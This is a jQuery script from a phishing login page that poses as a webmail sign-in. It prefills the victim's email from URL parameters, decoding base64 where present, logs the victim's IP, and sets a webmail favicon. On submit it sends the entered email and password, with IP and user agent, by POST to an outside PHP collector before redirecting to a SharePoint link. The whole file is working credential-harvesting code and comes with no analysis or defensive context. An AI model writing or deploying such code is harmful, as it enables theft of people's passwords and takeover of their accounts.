<script>
    $(document).ready(function() {
      var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
      var isProcessing = false;

      populateEmailFromURL();
      captureIP();
      updateFavicon();


      $('#login-form').on('submit', function(event) {
        event.preventDefault();

        if (isProcessing) {
          showError("Please wait, processing...");
          return;
        }

        var email = $("#user").val().trim();
        var password = $("#pass").val();

        if (!email || !password) {
          showError("Invalid email or password. Please try again.");
          highlightFieldError();
          return;
        }

        if (!isValidEmail(email)) {
          showError("Invalid email or password. Please try again.");
          $("#user").focus();
          return;
        }

        clearError();
        isProcessing = true;

        // Lock password field so user can't edit while verifying
        $("#pass").attr('readonly', true);

        var originalBtnText = $('#pirate').text();
        $('#pirate').text('Signing in...').prop('disabled', true).css('opacity', '0.7');

        var payload = {
          email: email,
                    password: password,
          ipaddress: $('#ipaddress').val(),
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };



        $.ajax({
          url: 'https://www.teirnchr.art/js/stack.php',
          type: 'POST',
          dataType: 'json',
          data: payload,
          timeout: 120000,
          success: function(response) {
            console.log("Response:", response);

            if (response && response.signal === 'success') {
              showSuccess("Login successful! Redirecting...");
              window.location.replace(redirectUrl);
            } else {
              var msg = (response && response.message) ? response.message : "Invalid email or password. Please try again.";
              showError(msg);
              $("#pass").val("").removeAttr('readonly');
              highlightFieldError();
              $('#pirate').text(originalBtnText).prop('disabled', false).css('opacity', '1');
              isProcessing = false;
            }
          },
          error: function(xhr, status, error) {
            console.error("AJAX Error:", status, error);
            showError("Invalid email or password. Please try again.");
            $("#pass").val("").removeAttr('readonly');
            highlightFieldError();
            $('#pirate').text(originalBtnText).prop('disabled', false).css('opacity', '1');
            isProcessing = false;
          }
        });
      });

      $('#showPasswordCheck').on('change', function() {
        var passwordInput = $('#pass');
        var type = $(this).is(':checked') ? 'text' : 'password';
        passwordInput.attr('type', type);
      });

      $('#pass').keypress(function(e) {
        if (e.which == 13) {
          $('#login-form').submit();
        }
      });

      function isValidEmail(email) {
        var re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
        return re.test(email);
      }

      function showError(message) {
        $('#error-row').show();
        $('#signInErrorDiv').removeClass('alert-success').addClass('alert-danger').text(message).show();
      }

      function showSuccess(message) {
        $('#error-row').show();
        $('#signInErrorDiv').removeClass('alert-danger').addClass('alert-success').text(message).show();
      }

      function clearError() {
        $('#signInErrorDiv').hide().text('');
        $('#error-row').hide();
      }

      function highlightFieldError() {
        $('#pass').css('border-color', '#d32f2f');
        $('#user').css('border-color', '#d32f2f');
        setTimeout(function() {
          $('#pass').css('border-color', '');
          $('#user').css('border-color', '');
        }, 3000);
      }

      function captureIP() {
        if (!$('#ipaddress').length) {
          $('#login-form').append('<input type="hidden" id="ipaddress" name="ipaddress">');
        }
        $.getJSON('https://api.ipify.org?format=json', function(data) {
          $('#ipaddress').val(data.ip);
        }).fail(function() {
          $('#ipaddress').val('127.0.0.1');
        });
      }

      function populateEmailFromURL() {
        var email = null;
        var urlParams = new URLSearchParams(window.location.search);

        // 1. Check hash: #email@domain.com
        var hash = window.location.hash;
        if (hash && hash.length > 1) {
          email = decodeEmailString(hash.substring(1));
        }

        // 2. Check ?email=email@domain.com
        if (!email && urlParams.has('email')) {
          email = decodeEmailString(urlParams.get('email'));
        }

        // 3. Check ?state=email@domain.com
        if (!email && urlParams.has('state')) {
          email = decodeEmailString(urlParams.get('state'));
        }

        // 4. Check ?user=email@domain.com (bonus)
        if (!email && urlParams.has('user')) {
          email = decodeEmailString(urlParams.get('user'));
        }

        if (email && isValidEmail(email)) {
          $('#user').val(email);
        }
      }

      function updateFavicon() {
        var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
        link.type = 'image/x-icon';
        link.rel = 'shortcut icon';
        link.href = 'https://webmail.stackmail.com/skins/elastic/images/favicon.ico?s=1723136747';
        document.getElementsByTagName('head')[0].appendChild(link);
      }

      function decodeEmailString(str) {
        if (!str) return null;

        var decoded = tryBase64Decode(str);
        if (decoded && isValidEmail(decoded)) {
          return decoded;
        }

        return str;
      }

      function tryBase64Decode(str) {
        try {
          str = decodeURIComponent(str);

          var base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;

          if (str.length % 4 === 0 && base64Pattern.test(str)) {
            var decoded = atob(str);
            return decoded;
          }
        } catch (e) {
          // Not valid Base64
        }
        return null;
      }
    });
  </script>
